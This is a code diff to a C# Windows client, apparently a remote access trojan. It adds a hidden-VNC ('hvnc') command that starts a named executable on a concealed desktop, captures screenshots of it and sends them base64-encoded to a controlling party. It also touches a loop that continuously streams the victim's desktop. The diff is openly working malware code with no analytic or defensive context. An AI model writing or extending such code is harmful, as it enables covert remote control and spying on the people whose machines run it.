@@ -3000,6 +3000,50 @@ namespace winClient48
                                 clsEZData.fn2dListToString(ls2d),
                             });
                         }
+                        else if (cmd[2] == "sc")
+                        {
+                            string szName = cmd[3];
+                            string szExe = cmd[4];
+
+                            try
+                            {
+                                clsfnHvncSession hvnc = fnGetHVNC(szName);
+                                if (hvnc == null)
+                                {
+
+                                    hvnc = new clsfnHvncSession(v, szName);
+                                    m_lsHVNC.Add(hvnc);
+                                    hvnc.fnCreate(szExe);
+                                }
+
+                                Bitmap bmp = hvnc.fnGetScreenshot();
+                                if (bmp == null)
+                                    throw new Exception();
+
+                                v.fnSendCommand(new string[]
+                                {
+                                    "hvnc",
+                                    "window",
+                                    "sc",
+                                    szName,
+                                    "1",
+                                    clsEZData.fnBitmapToBase64(bmp),
+                                    DateTime.Now.ToString("F"),
+                                });
+                            }
+                            catch (Exception ex)
+                            {
+                                v.fnSendCommand(new string[]
+                                {
+                                    "hvnc",
+                                    "window",
+                                    "sc",
+                                    szName,
+                                    "0",
+                                    ex.Message,
+                                });
+                            }
+                        }
                         else if (cmd[2] == "start")
                         {
                             string szName = cmd[3];
@@ -3254,7 +3298,7 @@ namespace winClient48
             while (is_connected && send_screenshot)
             {
                 Bitmap bmp = fnScreenShot(v, device_name, width, height);
-                string b64_img = clsGlobal.BitmapToBase64(bmp);
+                string b64_img = clsEZData.fnBitmapToBase64(bmp);
                 v.SendCommand("desktop|start|" + b64_img + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
 
                 Thread.Sleep(m_nDesktopDelay);
